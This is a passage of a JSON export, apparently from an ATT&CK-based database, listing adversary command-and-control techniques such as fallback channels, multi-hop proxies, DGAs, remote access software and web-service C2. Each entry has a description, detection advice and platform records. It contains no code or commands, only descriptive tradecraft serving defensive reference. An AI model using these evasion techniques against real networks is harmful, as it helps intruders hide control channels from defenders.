Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)<\/p>\n<p>Adversaries may use DGAs for the purpose of <a href=\"https:\/\/attack.mitre.org\/techniques\/T1008\">Fallback Channels<\/a>. When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":223,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":223,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":223,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":247,"name":"T1008 - Fallback Channels","sort_id":0,"external_id":"T1008","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":247,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":247,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":247,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":295,"name":"T1104 - Multi-Stage Channels","sort_id":0,"external_id":"T1104","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.<\/p>\n<p>Remote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.<\/p>\n<p>The different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or <a href=\"https:\/\/attack.mitre.org\/techniques\/T1008\">Fallback Channels<\/a> in case the original first-stage communication path is discovered and blocked.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure. Relating subsequent actions that may result from Discovery of the system and network information or Lateral Movement to the originating process may also yield useful data.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":295,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":295,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":295,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":296,"name":"T1188 - Multi-hop Proxy","sort_id":0,"external_id":"T1188","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":296,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":296,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":296,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":297,"name":"T1026 - Multiband Communication","sort_id":0,"external_id":"T1026","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Some adversaries may split communications between different protocols. There could be one protocol for inbound command and control and another for outbound data, allowing it to bypass certain firewall restrictions. The split could also be random to simply avoid data threshold alerts on any one communication.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":297,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":297,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":297,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":298,"name":"T1079 - Multilayer Encryption","sort_id":0,"external_id":"T1079","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>An adversary performs C2 communications using multiple layers of encryption, typically (but not exclusively) tunneling a custom encryption scheme within a protocol encryption scheme such as HTTPS or SMTPS.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":298,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":298,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":298,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":334,"name":"T1219 - Remote Access Software","sort_id":0,"external_id":"T1219","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)<\/p>\n<p>Remote access tools may be established and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system.<\/p>\n<p>Admin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns. (Citation: CrowdStrike 2015 Global Threat Report) (Citation: CrySyS Blog TeamSpy)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for applications and processes related to remote admin tools. Correlate activity with other suspicious behavior that may reduce false positives if these tools are used by legitimate users and administrators.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.\n\n[Domain Fronting](https:\/\/attack.mitre.org\/techniques\/T1090\/004) may be used in conjunction to avoid defenses. Adversaries will likely need to deploy and\/or install these remote tools to compromised systems. It may be possible to detect or prevent the installation of these tools with host-based solutions.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":334,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":334,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":334,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":336,"name":"T1105 - Ingress Tool Transfer","sort_id":0,"external_id":"T1105","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for file creation and files transferred into the network. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":336,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":336,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":336,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":372,"name":"T1071 - Application Layer Protocol","sort_id":0,"external_id":"T1071","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may communicate using application layer protocols to avoid detection\/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. <\/p>\n<p>Adversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. <\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":372,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":372,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":372,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":373,"name":"T1032 - Standard Cryptographic Protocol","sort_id":0,"external_id":"T1032","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may explicitly employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and\/or generated within malware samples\/configuration files.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":373,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":373,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":373,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":374,"name":"T1095 - Non-Application Layer Protocol","sort_id":0,"external_id":"T1095","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected\/tunneled protocols, such as Serial over LAN (SOL).<\/p>\n<p>ICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts; (Citation: Microsoft ICMP) however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)\n\nMonitor and investigate API calls to functions associated with enabling and\/or utilizing alternative communication channels.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":374,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":374,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":374,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":402,"name":"T1065 - Uncommonly Used Port","sort_id":0,"external_id":"T1065","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may conduct C2 communications over a non-standard port to bypass proxies and firewalls that have been improperly configured.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":402,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":402,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":402,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":408,"name":"T1102 - Web Service","sort_id":0,"external_id":"T1102","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may use an existing, legitimate external Web service as a means for relaying data to\/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL\/TLS encryption, giving adversaries an added level of protection.<\/p>\n<p>Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL\/TLS inspection if data is encrypted. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":408,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":408,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":408,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":424,"name":"T1438 - Alternate Network Mediums","sort_id":0,"external_id":"T1438","external_sub_id":null,"old_external_id":"MOB-T1041","old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries can communicate using cellular networks rather than enterprise Wi-Fi in order to bypass enterprise network monitoring systems. Adversaries may also communicate using other non-Internet Protocol mediums such as SMS, NFC, or Bluetooth to bypass network monitoring systems.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":424,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":424,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":434,"name":"T1436 - Commonly Used Port","sort_id":0,"external_id":"T1436","external_sub_id":null,"old_external_id":"MOB-T1039","old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. <\/p>\n<p>They may use commonly open ports such as<\/p>\n<ul>\n<li>TCP:80 (HTTP)<\/li>\n<li>TCP:443 (HTTPS)<\/li>\n<li>TCP:25 (SMTP)<\/li>\n<li>TCP\/UDP:53 (DNS)<\/li>\n<\/ul>\n<p>They may use the protocol associated with the port or a completely different protocol.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":434,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":434,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":443,"name":"T1520 - Domain Generation Algorithms","sort_id":0,"external_id":"T1520","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may use <a href=\"https:\/\/attack.mitre.org\/techniques\/T1520\">Domain Generation Algorithms<\/a> (DGAs) to procedurally generate domain names for command and control communication, and other uses such as malicious application distribution.(Citation: securelist rotexy 2018)<\/p>\n<p>DGAs increase the difficulty for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Detecting dynamically generated domains can be challenging due to the number of different DGA algorithms, constantly evolving malware families, and the increasing complexity of the algorithms. There is a myriad of approaches for detecting a pseudo-randomly generated domain name, including using frequency analysis, Markov chains, entropy, proportion of dictionary words, ratio of vowels to other characters, and more.(Citation: Data Driven Security DGA) CDN domains may trigger these detections due to the format of their domain names. In addition to detecting a DGA domain based on the name, another more general approach for detecting a suspicious domain is to check for recently registered names or for rarely visited domains.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":443,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":443,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":485,"name":"T1437 - Standard Application Layer Protocol","sort_id":0,"external_id":"T1437","external_sub_id":null,"old_external_id":"MOB-T1040","old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may communicate using a common, standardized application layer protocol such as HTTP, HTTPS, SMTP, or DNS to avoid detection by blending in with existing traffic.<\/p>\n<p>In the mobile environment, the Google Cloud Messaging (GCM; two-way) and Apple Push Notification Service (APNS; one-way server-to-device) are commonly used protocols on Android and iOS respectively that would blend in with routine device traffic and are difficult for enterprises to inspect. Google reportedly responds to reports of abuse by blocking access to GCM.(Citation: Kaspersky-MobileMalware)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":485,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":485,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":486,"name":"T1521 - Standard Cryptographic Protocol","sort_id":0,"external_id":"T1521","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may explicitly employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and\/or generated within malware samples\/configuration files.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Since data encryption is a common practice in many legitimate applications and uses standard programming language-specific APIs, encrypting data for command and control communication is undetectable to the user.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":486,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":486,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":493,"name":"T1509 - Uncommonly Used Port","sort_id":0,"external_id":"T1509","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may use non-standard ports to exfiltrate information.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Detection would most likely be at the enterprise level, through packet and\/or netflow inspection. Many properly configured firewalls may also naturally block command and control traffic over non-standard ports.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":493,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":493,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":494,"name":"T1481 - Web Service","sort_id":0,"external_id":"T1481","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may use an existing, legitimate external Web service as a means for relaying commands to a compromised system.<\/p>\n<p>These commands may also include pointers to command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated\/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.<\/p>\n<p>Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL\/TLS encryption, giving adversaries an added level of protection.<\/p>\n<p>Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 